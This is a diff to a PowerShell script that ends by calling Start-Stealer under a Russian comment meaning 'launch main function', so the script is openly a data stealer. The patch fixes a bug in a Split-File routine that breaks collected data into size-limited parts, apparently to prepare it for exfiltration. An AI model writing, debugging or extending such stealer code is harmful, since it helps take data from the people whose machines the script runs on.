@@ -446,7 +446,7 @@ function Split-File {
             $partStream = [System.IO.File]::Create($target)
             $written = 0
             while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
-                $toRead = [Math]::Min($buffsize, $MaxBytes - $written, $fs.Length - $fs.Position)
+                $toRead = [System.Linq.Enumerable]::Min(@($buffsize, ($MaxBytes - $written), ($fs.Length - $fs.Position)))
                 $buffer = New-Object byte[] $toRead
                 $read = $fs.Read($buffer, 0, $toRead)
                 if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
@@ -459,6 +459,7 @@ function Split-File {
     } finally { $fs.Close() }
     return $files
 }
+
 
 # --- Запуск основной функции ---
 Start-Stealer
